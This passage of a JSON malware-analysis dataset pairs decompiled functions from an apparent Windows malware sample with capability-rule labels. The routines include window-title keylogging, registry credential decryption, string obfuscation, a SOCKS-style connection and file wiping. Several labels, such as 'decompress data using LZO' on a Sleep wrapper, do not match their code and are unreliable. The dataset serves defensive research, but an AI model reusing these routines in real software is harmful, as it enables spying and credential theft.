((iVar2 == 0) && (cVar1 = fcn.004086b4(),  cVar1 != '\\0')) {\n                        return uStack56;\n                    }\n                    fcn.00408d8a();\n                }\n            }\n        }\n        else {\n            puStack52 = &stack0xffffffe4;\n            uStack56 = param_2;\n            uStack60 = param_1;\n            uStack64 = 0x408a66;\n            cVar1 = fcn.00407c90();\n            if (cVar1 == '\\x01') {\n                puStack52 = 0x6;\n                uStack56 = 1;\n                uStack60 = 2;\n                uStack64 = 0x408a90;\n                iStack44 = sub.WS2_32.dll_socket();\n                if (iStack44 == -1) {\n                    uStack56 = 0xffffffff;\n                }\n                else {\n                    uStack64 = 0x10;\n                    iVar2 = sub.WS2_32.dll_connect();\n                    if (iVar2 != 0) {\n                        fcn.00408d8a(&stack0xffffffc8);\n                        uStack56 = 0xffffffff;\n                    }\n                }\n            }\n            else {\n                uStack56 = 0xffffffff;\n            }\n        }\n    }\n    return uStack56;\n}\n",
        "token_count": 949
    },
    "0041652e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041652e(int32_t param_1, uint32_t param_2)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uStack8;\n    \n    for (uStack8 = 0; uStack8 < param_2; uStack8 = uStack8 + 1) {\n        uVar2 = fcn.00416487(1, 0xff);\n        if ((uVar2 & 1) == 0) {\n            uVar1 = fcn.00416487(0x61, 0x7a);\n            *(param_1 + uStack8) = uVar1;\n        }\n        else if ((uStack8 < 3) || ((uStack8 & 1) == 0)) {\n            uVar1 = fcn.00416487(0x41, 0x5a);\n            *(param_1 + uStack8) = uVar1;\n        }\n        else {\n            uVar1 = fcn.00416487(0x30, 0x39);\n            *(param_1 + uStack8) = uVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0040e97e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.0040e97e(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar auStack140 [32];\n    uchar auStack108 [32];\n    uchar auStack76 [32];\n    uchar auStack44 [16];\n    uchar auStack28 [28];\n    \n    fcn.004164a5(auStack108, 0x20);\n    fcn.004164a5(0x427280, 0x10);\n    fcn.0040e813(0x41e5e0, auStack108, auStack140);\n    iVar2 = fcn.0040571b(0x4272a0, auStack140, 0x20);\n    if (iVar2 == 0) {\n        cVar1 = fcn.004057d1(0x4272a0, 0x427280, 0x41e7cc, auStack28, 0x10, 0);\n        if (cVar1 == '\\x01') {\n            fcn.0041a5e1(auStack76, auStack108, 0x20);\n            fcn.0041a5e1(auStack44, 0x427280, 0x10);\n            fcn.00408b8f(*param_1, 0x99, auStack76, 0x40);\n            uVar3 = 1;\n        }\n        else {\n            fcn.00408d8a(param_1);\n            uVar3 = 0;\n        }\n    }\n    else {\n        fcn.00408d8a(param_1);\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 384
    },
    "00413125": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00413125(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uchar auStack48 [12];\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack28 = 0;\n    uStack84 = 4;\n    uStack88 = 0;\n    iStack92 = param_3;\n    puStack96 = 0x41314c;\n    fcn.0041a59f();\n    uStack76 = 0xf0000000;\n    uStack80 = 1;\n    uStack84 = 0;\n    uStack88 = 0;\n    iStack92 = 0x4245c4;\n    puStack96 = 0x413178;\n    iVar1 = sub.ADVAPI32.DLL_CryptAcquireContextA();\n    if (iVar1 != 0) {\n        puStack96 = &stack0xffffffd0;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0x8004;\n        uStack112 = *0x4245c4;\n        uStack116 = 0x4131b0;\n        iVar1 = sub.ADVAPI32.DLL_CryptCreateHash();\n        if (iVar1 != 0) {\n            uStack120 = 0;\n            uStack124 = uStack32;\n            iVar1 = sub.ADVAPI32.DLL_CryptHashData(uStack68, uStack36);\n            if (iVar1 != 0) {\n                uStack108 = 0x14;\n                iVar1 = sub.ADVAPI32.DLL_CryptGetHashParam(uStack84, 2, &stack0xffffff98, &stack0xffffff94, 0);\n                if (iVar1 != 0) {\n                    uStack100 = uStack100 & 0xffffff;\n                    puStack96 = NULL;\n                    for (iStack92 = 0; iStack92 < 0x14; iStack92 = iStack92 + 1) {\n                        uStack100 = uStack100 & 0xffffff | uStack100._3_1_ + (&stack0xffffff84)[iStack92] << 0x18;\n                        fcn.00419fa8(iStack64 + puStack96, 2, \"%.2X\", (&stack0xffffff84)[iStack92]);\n                        puStack96 = puStack96 + 2;\n                    }\n                    fcn.00419fa8(iStack64 + puStack96, 2, \"%.2X\", uStack100._3_1_);\n                    return 1;\n                }\n            }\n            sub.ADVAPI32.DLL_CryptDestroyHash(uStack104);\n        }\n        sub.ADVAPI32.DLL_CryptReleaseContext(*0x4245c4, 0);\n    }\n    return 0;\n}\n",
        "token_count": 730
    },
    "00407e3e": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407f71)\n// WARNING: Removing unreachable block (ram,0x00407f87)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407e3e(uint param_1, uint param_2, uchar *param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puStack344;\n    uint *puStack340;\n    uint uStack336;\n    uint uStack324;\n    int32_t iStack320;\n    char cStack105;\n    char cStack104;\n    uchar auStack89 [28];\n    uchar auStack61 [20];\n    uchar uStack41;\n    uint uStack40;\n    uchar uStack33;\n    uint uStack32;\n    uchar auStack28 [16];\n    int32_t iStack12;\n    \n    puStack340 = &uStack32;\n    puStack344 = param_3;\n    cVar1 = fcn.00407c90(param_2);\n    if (cVar1 == '\\x01') {\n        puStack340 = 0x9;\n        puStack344 = NULL;\n        fcn.0041a59f(&uStack41);\n        uStack41 = 4;\n        uStack40 = CONCAT31(uStack40._1_3_, 1);\n        puStack340 = 0x2;\n        puStack344 = &uStack32 + 2;\n        fcn.0041a5e1(&uStack40 + 1);\n        puStack340 = 0x4;\n        puStack344 = auStack28;\n        fcn.0041a5e1(&uStack40 + 3);\n        uStack33 = 0;\n        uStack336 = 0;\n        puStack340 = 0x9;\n        puStack344 = &uStack41;\n        iVar3 = sub.WS2_32.dll_send(param_1);\n        if (iVar3 == 9) {\n            fcn.0041a59f(auStack61, 0, 4);\n            uStack32 = 0;\n            iStack320 = iStack12;\n            uStack32 = 0;\n            uStack324 = 1;\n            iVar3 = sub.WS2_32.dll_select(iStack12 + 1, &uStack324, 0, 0, 0);\n            if (((iVar3 < 1) || (iVar3 = sub.WS2_32.dll___WSAFDIsSet(uStack32, &puStack344),  iVar3 == 0)) ||\n               (iVar3 = sub.WS2_32.dll_recv(uStack40, auStack89, 4, 0),  iVar3 != 4)) {\n                uVar2 = 0;\n            }\n            else if ((cStack105 == '\\0') && (cStack104 == 'Z')) {\n                uVar2 = 1;\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 691
    },
    "00408090": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408229)\n// WARNING: Removing unreachable block (ram,0x0040823f)\n\nbool fcn.00408090(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puStack848;\n    uchar *puStack844;\n    int32_t iStack840;\n    uint uStack836;\n    uint uStack828;\n    int32_t iStack824;\n    char cStack611;\n    uchar auStack596 [28];\n    uchar auStack568 [24];\n    uint uStack544;\n    ushort uStack538;\n    uchar auStack536 [4];\n    uchar uStack532;\n    uchar uStack531;\n    uchar uStack528;\n    uchar auStack527 [483];\n    uint uStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    puStack844 = param_2;\n    puStack848 = 0x4080a5;\n    iStack20 = sub.msvcrt.dll_strlen();\n    iStack20 = iStack20 + 10;\n    if (iStack20 < 0x201) {\n        uStack836 = 0x200;\n        iStack840 = 0;\n        puStack844 = &stack0xfffffdec;\n        puStack848 = 0x4080e5;\n        fcn.0041a59f();\n        uStack532 = 4;\n        uStack531 = 1;\n        puStack844 = param_3 & 0xffff;\n        puStack848 = 0x408107;\n        uStack538 = sub.WS2_32.dll_htons();\n        iStack840 = 2;\n        puStack844 = &stack0xfffffde6;\n        puStack848 = &stack0xfffffdea;\n        fcn.0041a5e1();\n        uStack544 = 0x1000000;\n        iStack840 = 4;\n        puStack844 = &stack0xfffffde0;\n        puStack848 = &stack0xfffffdec;\n        fcn.0041a5e1();\n        uStack528 = 0;\n        puStack848 = param_1;\n        iStack840 = sub.msvcrt.dll_strlen();\n        puStack844 = param_1;\n        puStack848 = &stack0xfffffdf1;\n        fcn.0041a5e1();\n        (&stack0xfffffde8)[iStack24] = 0;\n        uStack836 = 0;\n        iStack840 = iStack24;\n        puStack844 = &stack0xfffffde8;\n        iVar1 = sub.WS2_32.dll_send();\n        if (iVar1 == iStack40) {\n            fcn.0041a59f(&stack0xfffffdc8, 0, 8);\n            uStack36 = 0;\n            iStack824 = iStack16;\n            uStack36 = 0;\n            uStack828 = 1;\n            puStack848 = NULL;\n            iVar1 = sub.WS2_32.dll_select(iStack16 + 1, &stack0xfffffcc4, 0, 0);\n            if (((iVar1 < 1) || (iVar1 = sub.WS2_32.dll___WSAFDIsSet(uStack36, &stack0xfffffcb0),  iVar1 == 0)) ||\n               (iVar1 = sub.WS2_32.dll_recv(uStack44, &stack0xfffffdac, 8, 0),  iVar1 != 8)) {\n                bVar2 = false;\n            }\n            else {\n                bVar2 = cStack611 == 'Z';\n            }\n        }\n        else {\n            bVar2 = false;\n        }\n    }\n    else {\n        bVar2 = false;\n    }\n    return bVar2;\n}\n",
        "token_count": 864
    },
    "0040b60e": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint fcn.0040b60e(uint param_1)\n\n{\n    char acStack88 [64];\n    int32_t iStack24;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    acStack88[0] = '_';\n    acStack88[1] = 0x42;\n    acStack88[2] = 0x71;\n    acStack88[3] = 0x77;\n    acStack88[4] = 0x48;\n    acStack88[5] = 0x61;\n    acStack88[6] = 0x46;\n    acStack88[7] = 0x38;\n    acStack88[8] = 0x54;\n    acStack88[9] = 0x6b;\n    acStack88[10] = 0x4b;\n    acStack88[11] = 0x44;\n    acStack88[12] = 0x4d;\n    acStack88[13] = 0x66;\n    acStack88[14] = 0x4f;\n    acStack88[15] = 0x7a;\n    acStack88[16] = 0x51;\n    acStack88[17] = 0x41;\n    acStack88[18] = 0x53;\n    acStack88[19] = 0x78;\n    acStack88[20] = 0x34;\n    acStack88[21] = 0x56;\n    acStack88[22] = 0x75;\n    acStack88[23] = 0x58;\n    acStack88[24] = 100;\n    acStack88[25] = 0x5a;\n    acStack88[26] = 0x69;\n    acStack88[27] = 0x62;\n    acStack88[28] = 0x55;\n    acStack88[29] = 0x49;\n    acStack88[30] = 0x65;\n    acStack88[31] = 0x79;\n    acStack88[32] = 0x6c;\n    acStack88[33] = 0x4a;\n    acStack88[34] = 0x57;\n    acStack88[35] = 0x68;\n    acStack88[36] = 0x6a;\n    acStack88[37] = 0x30;\n    acStack88[38] = 0x6d;\n    acStack88[39] = 0x35;\n    acStack88[40] = 0x6f;\n    acStack88[41] = 0x32;\n    acStack88[42] = 0x45;\n    acStack88[43] = 0x72;\n    acStack88[44] = 0x4c;\n    acStack88[45] = 0x74;\n    acStack88[46] = 0x36;\n    acStack88[47] = 0x76;\n    acStack88[48] = 0x47;\n    acStack88[49] = 0x52;\n    acStack88[50] = 0x4e;\n    acStack88[51] = 0x39;\n    acStack88[52] = 0x73;\n    acStack88[53] = 0x59;\n    acStack88[54] = 0x31;\n    acStack88[55] = 0x6e;\n    acStack88[56] = 0x33;\n    acStack88[57] = 0x50;\n    acStack88[58] = 0x70;\n    acStack88[59] = 99;\n    acStack88[60] = 0x37;\n    acStack88[61] = 0x67;\n    acStack88[62] = 0x2d;\n    acStack88[63] = 0x43;\n    iStack24 = 6;\n    fcn.00419fa8(0x424340, 0x104, 0x41ecd7, param_1);\n    iStack16 = 0;\n    do {\n        if (*(iStack16 + 0x424340) == '\\0') {\n            return 0x424340;\n        }\n        for (uStack20 = 0; uStack20 < 0x40; uStack20 = uStack20 + 1) {\n            if (*(iStack16 + 0x424340) == acStack88[uStack20]) {\n                *(iStack16 + 0x424340) = acStack88[iStack24 + uStack20 & 0x3f];\n                break;\n            }\n        }\n        iStack16 = iStack16 + 1;\n    } while( true );\n}\n",
        "token_count": 1075
    },
    "0041360d": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint fcn.0041360d(uint param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uchar uVar3;\n    uint uVar4;\n    char cStack25;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    cVar2 = fcn.004130c7(param_1, &iStack24, 4, param_2 + 0x34);\n    if (cVar2 == '\\x01') {\n        do {\n            cVar2 = fcn.004130c7(param_1, &cStack25, 1, iStack16 + iStack24 + param_2 + 1);\n            if (cVar2 != '\\x01') {\n                return 0;\n            }\n            iStack16 = iStack16 + 1;\n        } while (((cStack25 != '\\0') && (cStack25 != '@')) && (iStack16 + iStack24 + param_2 + 1 < param_3));\n        if (cStack25 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            for (iStack20 = 0;\n                ((cStack25 != '\\0' && (iStack16 + iStack24 + param_2 + 1 < param_3)) && (iStack20 < param_5));\n                iStack20 = iStack20 + 1) {\n                cVar2 = fcn.004130c7(param_1, &cStack25, 1, iStack16 + iStack24 + param_2 + 1);\n                if (cVar2 != '\\x01') {\n                    return 0;\n                }\n                if (cStack25 == '?') break;\n                puVar1 = iStack20 + param_4;\n                uVar3 = fcn.0041a458(cStack25);\n                *puVar1 = uVar3;\n                iStack16 = iStack16 + 1;\n            }\n            *(param_4 + iStack20) = 0;\n            uVar4 = 1;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 520
    },
    "00405d0c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405d0c(uchar param_1)\n\n{\n    *(*0x421000 + *0x421004) = param_1;\n    *0x421004 = *0x421004 + 1;\n    return;\n}\n",
        "token_count": 55
    },
    "00408b4b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00408b4b(void)\n\n{\n    int32_t iVar1;\n    uchar auStack412 [412];\n    \n    iVar1 = sub.WS2_32.dll_WSAStartup(0x202, auStack412);\n    if (iVar1 != 0) {\n    // WARNING: Subroutine does not return\n        sub.KERNEL32.dll_ExitProcess(0);\n    }\n    sub.KERNEL32.dll_InitializeCriticalSection(0x42430c);\n    return;\n}\n",
        "token_count": 106
    },
    "00409508": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00409508(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint uStack16;\n    uint auStack12 [2];\n    \n    auStack12[1] = 0x409513;\n    iVar2 = fcn.0041ce38();\n    iVar2 = -iVar2;\n    *(&stack0x00000000 + iVar2) = &stack0x00000018 + iVar2;\n    *(&stack0xfffffffc + iVar2) = 0x1000;\n    *(&stack0xfffffff8 + iVar2) = 0x409529;\n    iVar3 = sub.KERNEL32.dll_GetLogicalDriveStringsA();\n    piVar4 = &stack0xfffffff4 + iVar2;\n    if (iVar3 == 0) {\n        *(&stack0x00000000 + iVar2) = 0;\n        *(&stack0xfffffffc + iVar2) = 0;\n        *(&stack0xfffffff8 + iVar2) = 0xa5;\n        *(&stack0xfffffff4 + iVar2) = *(&stack0x00001024 + iVar2);\n        *(&stack0xfffffff0 + iVar2) = 0x409557;\n        fcn.00408b8f();\n    }\n    else {\n        *(&stack0x00001010 + iVar2) = 0;\n        for (; *(piVar4 + piVar4[0x407] + 0x1c) != '\\0'; piVar4 = piVar4 + -1) {\n            iVar2 = piVar4[0x407];\n            *piVar4 = piVar4 + piVar4[0x407] + 0x1c;\n            piVar4[-1] = 0x409588;\n            uVar1 = sub.KERNEL32.dll_GetDriveTypeA();\n            *(piVar4 + iVar2 + 0x1a) = uVar1;\n            *(piVar4 + piVar4[0x406] + 0x1b) = 7;\n            piVar4[0x406] = piVar4[0x406] + 4;\n        }\n        piVar4[3] = piVar4[0x407];\n        piVar4[2] = piVar4 + 7;\n        piVar4[1] = 0xa4;\n        *piVar4 = piVar4[0x40c];\n        piVar4[-1] = 0x4095e4;\n        fcn.00408b8f();\n    }\n    return;\n}\n",
        "token_count": 594
    },
    "0040a9af": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a9af(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_retaddr;\n    uint uStack8;\n    \n    uVar1 = sub.KERNEL32.dll_GetFileAttributesA(param_1);\n    if ((uVar1 != 0xffffffff) && (((uVar1 & 4) != 0 || ((uVar1 & 2) != 0)))) {\n        sub.KERNEL32.dll_SetFileAttributesA(unaff_retaddr, 0x80);\n    }\n    uVar1 = sub.KERNEL32.dll_DeleteFileA(uStack8);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 153
    },
    "0040aa34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0040aa34(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    uVar1 = sub.KERNEL32.dll_GetFileAttributesA(param_1);\n    if ((uVar1 == 0xffffffff) || ((uVar1 & 0x10) != 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 105
    },
    "0040aa6f": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0040aa6f(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    uVar1 = sub.KERNEL32.dll_GetFileAttributesA(param_1);\n    if ((uVar1 == 0xffffffff) || ((uVar1 & 0x10) == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 106
    },
    "0040b294": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040b294(uint param_1)\n\n{\n    sub.KERNEL32.dll_Sleep(param_1);\n    return;\n}\n",
        "token_count": 31
    },
    "0040b4e9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040b4e9(uint param_1)\n\n{\n    sub.KERNEL32.dll_LoadLibraryA(param_1);\n    return;\n}\n",
        "token_count": 34
    },
    "0040cb3e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040cb3e(void)\n\n{\n    if (*0x41e7b0 != 0) {\n        sub.KERNEL32.dll_ReleaseMutex(*0x41e7b0);\n        sub.KERNEL32.dll_CloseHandle(*0x41e7b0);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0040da18": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040da18(void)\n\n{\n    int32_t iVar1;\n    uchar auStack1332 [12];\n    uchar auStack1320 [244];\n    uchar auStack1076 [1024];\n    ushort uStack52;\n    ushort uStack50;\n    ushort uStack46;\n    ushort uStack44;\n    ushort uStack42;\n    ushort uStack40;\n    uint auStack36 [5];\n    int32_t iStack16;\n    \n    iStack16 = sub.USER32.dll_GetForegroundWindow();\n    if (*0x424480 != iStack16) {\n        *0x424480 = iStack16;\n        sub.KERNEL32.dll_GetLocalTime(auStack36);\n        iVar1 = sub.USER32.dll_GetWindowTextA(*0x424480, auStack1320, 0x100);\n        if (iVar1 != 0) {\n            auStack36[0] = fcn.00419fa8(auStack1076, 0x400, \"\\r\\n\\r\\n[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\\r\\n\", \n                                        auStack1332, uStack46, uStack50, uStack52, uStack44, uStack42, uStack40);\n            fcn.0040d74c(auStack1076, auStack36[0], 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "0040e67d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040e67d(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_retaddr;\n    uint16_t uStack292;\n    ushort uStack290;\n    uchar auStack288 [2];\n    ushort uStack286;\n    uchar auStack276 [276];\n    \n    cVar1 = fcn.0040b97c(0x40);\n    if (cVar1 == '\\x01') {\n        sub.KERNEL32.dll_GetLocalTime(auStack288);\n        uVar3 = uStack292;\n        fcn.00419fa8(auStack276, 0x104, \"%.2d-%.2d-%.4d\", uStack286, uStack290, uVar3);\n        iVar2 = fcn.0041a18a(auStack276, unaff_retaddr, 10);\n        if (iVar2 == 0) {\n            fcn.0040d74c(0, 0, 1);\n        }\n        fcn.00419fa8(auStack276, 0x104, 0x41f2e7, 0x41e720, unaff_retaddr, uVar3);\n        fcn.0040a9af(auStack276);\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "004132fa": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.004132fa(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puStack2184;\n    uint uStack2180;\n    uint32_t uStack2176;\n    int32_t *piStack2172;\n    uint uStack2168;\n    uchar *puStack2164;\n    uchar auStack2160 [24];\n    uchar auStack2136 [2024];\n    uint uStack112;\n    uint uStack88;\n    uchar auStack83 [19];\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t *piStack52;\n    int32_t *piStack48;\n    code *pcStack44;\n    uint uStack40;\n    uint uStack20;\n    uint uStack16;\n    uint *puStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    fcn.0041a59f(param_4, 0, param_5);\n    cVar1 = fcn.00413125(param_2, param_3, auStack83);\n    if (cVar1 == '\\x01') {\n        pcStack44 = pcStack44 & 0xffffff;\n        uStack88 = 0x800;\n        uStack16 = 0;\n        uVar2 = fcn.0040b60e(\"Y0Zs5Nh.Sii\");\n        uStack16 = fcn.0040b4e9(uVar2);\n        uVar2 = fcn.0040b60e(\"P0Zs5uRs0W5dY5aC5C\");\n        uStack20 = fcn.0040b4ff(uStack16, uVar2);\n        puStack2184 = &uStack88;\n        iVar3 = sub.ADVAPI32.DLL_RegQueryValueExA(param_1, auStack83, 0, 0, auStack2136);\n        if (iVar3 == 0) {\n            puStack2164 = auStack2160;\n            uStack2168 = uStack112;\n            uStack2180 = uStack16;\n            puStack2184 = puStack12;\n            iVar3 = (*pcStack44)(&uStack2168, 0, &puStack2184, 0, 0, 1, &uStack2176);\n            if (iVar3 != 0) {\n                piStack48 = piStack2172;\n                if (piStack2172[2] + *piStack2172 + piStack2172[1] <= uStack2176) {\n                    iStack56 = piStack2172[1] + *piStack2172 + piStack2172;\n                    iStack60 = iStack56 + piStack2172[9];\n                    piStack52 = piStack2172 + 0xd;\n                    iStack64 = iStack56 + *piStack52;\n                    fcn.00419fa8(uStack8, uStack4, \"%c%S\\a%S:%S\\b\\b\\b\\b\", 2, uStack16, iStack60, iStack64);\n                }\n                sub.KERNEL32.dll_LocalFree(piStack2172);\n                return 1;\n            }\n        }\n        fcn.0040b51d(uStack40);\n    }\n    return 0;\n}\n",
        "token_count": 751
    },
    "00414109": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00414109(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *unaff_retaddr;\n    uchar auStack1904 [516];\n    int32_t iStack1388;\n    uint32_t auStack1384 [2];\n    uchar auStack1376 [36];\n    uchar auStack1340 [276];\n    uchar auStack1064 [524];\n    uchar auStack540 [508];\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack8;\n    int32_t iStack4;\n    \n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iVar1 = fcn.00419fa8(auStack540, 0x204, \"%s\\\\*.*\", unaff_retaddr);\n    if ((iVar1 != -1) && (iStack28 = sub.KERNEL32.dll_FindFirstFileA(auStack540, auStack1376),  iStack28 != -1)) {\n        do {\n            iVar1 = fcn.0041a1d8(auStack1340, 0x41ff7d);\n            if ((iVar1 != 0) && (iVar1 = fcn.0041a1d8(auStack1340, 0x41ff7f),  iVar1 != 0)) {\n                if ((auStack1384[0] & 0x10) == 0) {\n                    uVar2 = fcn.0040b60e(\"4RSdf.SC5\");\n                    iVar1 = fcn.0041a1d8(uVar2, auStack1340);\n                    if (iVar1 == 0) {\n                        fcn.00419fa8(auStack1064, 0x204, 0x41f99a, uStack8, auStack1340);\n                        iStack1388 = fcn.00413ad7(auStack1064);\n                        if (iStack1388 != 0) {\n                            iStack32 = sub.msvcrt.dll_strlen(iStack1388);\n                            uVar2 = fcn.0041a022(unaff_retaddr, *0x4245c0, &iStack1388, iStack32, 1);\n                            *unaff_retaddr = uVar2;\n                            *0x4245c0 = iStack32 + *0x4245c0;\n                        }\n                    }\n                }\n                else {\n                    fcn.00419fa8(auStack1904, 0x204, 0x41f99a, uStack8, auStack1340);\n                    fcn.00414109(auStack1904, iStack4 + 1, unaff_retaddr);\n                }\n            }\n            iVar1 = sub.KERNEL32.dll_FindNextFileA(iStack28, auStack1384);\n        } while (iVar1 != 0);\n        sub.KERNEL32.dll_FindClose();\n    }\n    return;\n}\n",
        "token_count": 639
    },
    "004169e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar * fcn.004169e0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uchar *puStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    int32_t iStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar auStack16 [8];\n    uint uStack8;\n    \n    uStack20 = 0;\n    puStack44 = &stack0xfffffff0;\n    uStack48 = 0x20019;\n    uStack52 = 0;\n    uStack56 = param_2;\n    puStack60 = param_1;\n    iStack64 = 0x416a17;\n    iVar1 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        puStack60 = &stack0xffffffd4;\n        iStack64 = 0;\n        uStack68 = 0;\n        uStack72 = 0;\n        uStack76 = uStack8;\n        uStack80 = uStack36;\n        puStack84 = 0x416a56;\n        iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA();\n        if (iVar1 == 0) {\n            iStack64 = sub.msvcrt.dll_calloc(uStack68, 1);\n            if (iStack64 != 0) {\n                puStack84 = &stack0xffffffbc;\n                puStack92 = &stack0xffffffb8;\n                iStack88 = iStack64;\n                iVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(puStack60, uStack32, 0);\n                if (iVar1 != 0) {\n                    fcn.0040b4bf(&stack0xffffffa8);\n                }\n            }\n            sub.ADVAPI32.DLL_RegCloseKey(puStack84);\n            return puStack92;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 487
    },
    "00416ae2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
